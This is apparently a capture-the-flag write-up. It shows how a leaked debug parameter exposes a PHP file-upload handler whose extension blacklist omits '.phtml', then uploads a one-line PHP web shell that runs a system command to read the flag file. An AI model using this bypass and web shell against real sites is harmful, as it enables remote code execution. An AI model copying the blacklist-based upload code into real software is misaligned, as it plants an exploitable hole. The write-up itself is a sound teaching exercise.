Observe that an HTML comment leaks the parameter `?debug=1`

Visiting `http://<domain>:<port>/?debug=1` leaks the PHP code running on the website.
```rb
<?php

if (isset($_GET['debug']) && $_GET['debug'] == 1) {
    header('Content-Type: text/plain');
    readfile(__FILE__);
    exit;
}

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["uploadedFile"])) {
    $targetDir = "uploads/";
    $targetFile = $targetDir . basename($_FILES["uploadedFile"]["name"]);
    $uploadOk = 1;
    $fileType = strtolower(pathinfo($targetFile, PATHINFO_EXTENSION));

    if ($_FILES["uploadedFile"]["size"] > 5000) {
        $uploadStatus = ["success" => false, "message" => "Sorry, your file is too large."];
        $uploadOk = 0;
    }

    $blacklist = array("php", "php2", "php3", "php4", "php5", "php6", "php7", "phps", "phps", "pht", "phtm", "pgif", "shtml", "htaccess", "phar", "inc", "hphp", "ctp", "module");
    if (in_array($fileType, $blacklist)) {
        $uploadStatus = ["success" => false, "message" => "Sorry, this file extension is not allowed."];
        $uploadOk = 0;
    }

    if ($uploadOk != 0) {
        if (move_uploaded_file($_FILES["uploadedFile"]["tmp_name"], $targetFile)) {
            $uploadStatus = ["success" => true, "message" => "The file <b>" . $targetFile . "</b> has been uploaded."];
        } else {
            $uploadStatus = ["success" => false, "message" => "Sorry, there was an error uploading your file."];
        }
    }
}
```

From this PHP code, we see that a blacklist is applied to the file extensions:
```rb
$blacklist = array("php", "php2", "php3", "php4", "php5", "php6", "php7", "phps", "phps", "pht", "phtm", "pgif", "shtml", "htaccess", "phar", "inc", "hphp", "ctp", "module");
```

Using the resource below, we find that the extension `.phtml` can also be used for PHP code execution, and it not on the blacklist.
https://book.hacktricks.xyz/pentesting-web/file-upload

Prepare a file called `exploit.phtml` with the contents:
```php
<?php system("cat /flag/flag.txt")?>
```

Upload `exploit.phtml`, and visit `/uploads/exploit.phtml`

Flag: `SUCTF{d0nt_us3_bl4ckl1sts}`